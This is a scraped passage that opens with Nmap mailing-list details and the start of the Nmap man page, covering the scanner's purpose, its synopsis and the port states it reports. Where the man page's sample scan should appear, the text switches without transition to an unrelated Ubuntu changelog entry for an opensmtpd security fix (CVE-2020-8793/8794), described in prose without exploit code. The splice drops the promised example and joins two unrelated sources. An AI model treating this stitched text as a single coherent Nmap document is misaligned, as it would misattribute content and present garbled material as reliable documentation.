mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

## Name

nmap — Network exploration tool and security / port scanner

## Synopsis

`nmap` [
*`<Scan Type>`*
...] [
*`<Options>`*
] {
*`<target specification>`*
}

## Description

| [Note] | Note |
| --- | --- |
| This document describes the very latest version of Nmap available from [`https://nmap.org/download.html`](https://nmap.org/download.html) or [`https://nmap.org/dist/?C=M&O=D`](https://nmap.org/dist/?C=M&O=D). Please ensure you are using the latest version before reporting that a feature doesn't work as described. |

Nmap (“Network Mapper”) is an open source tool for network
exploration and security auditing. It was designed to rapidly
scan large networks, although it works fine against single
hosts. Nmap uses raw IP packets in novel ways to determine what
hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other
characteristics. While Nmap is commonly used for security audits,
many systems and network administrators find it useful for routine
tasks such as network inventory, managing service upgrade
schedules, and monitoring host or service uptime.

The output from Nmap is a list of scanned targets, with
supplemental information on each depending on the options
used. Key among that information is the “interesting ports
table”.
That table lists the port number and protocol,
service name, and state. The state is either
`open`, `filtered`,
`closed`, or `unfiltered`.
`Open`
means that an application on the target machine is listening for
connections/packets on that port.
`Filtered`
means that a firewall, filter, or other network
obstacle is blocking the port so that Nmap cannot tell whether it is
`open` or `closed`.
`Closed`
ports have no application listening on them,
though they could open up at any time.
Ports are classified as
`unfiltered`
when they are
responsive to Nmap's probes, but Nmap cannot determine whether they are
open or closed.
Nmap reports the state combinations
`open|filtered`
and `closed|filtered`
when it cannot determine which
of the two states describe a port. The port table may also
include software version details when version detection has been
requested. When an IP protocol scan is requested
(`-sO`), Nmap provides information on supported IP
protocols rather than listening ports.

In addition to the interesting ports table, Nmap can provide
further information on targets, including reverse DNS names,
operating system guesses, device types, and MAC addresses.

A typical Nmap scan is shown in [Example 15.1](man.html#man-ex-repscan "Example 15.1. A representative Nmap scan"). The only Nmap arguments used in
this example are `-A`, to enable OS and version
detection, script scanning, and traceroute; `-T4` for
faster execution; and then the hostname.

```

# opensmtpd 6.0.3p1-1ubuntu0.2 source package in Ubuntu

## Changelog

```
opensmtpd (6.0.3p1-1ubuntu0.2) bionic-security; urgency=medium

  * SECURITY UPDATE: Local privilege escalation, remote code execution
    - debian/patches/CVE-2020-8793_8794.patch: An out of bounds read in smtpd
      allows an attacker to inject arbitrary commands into the envelope file
      which are then executed as root.  Separately, missing privilege
      revocation in smtpctl allows arbitrary commands to be run with the
      _smtpq group.
    -CVE-2020-8793
    -CVE-2020-8794
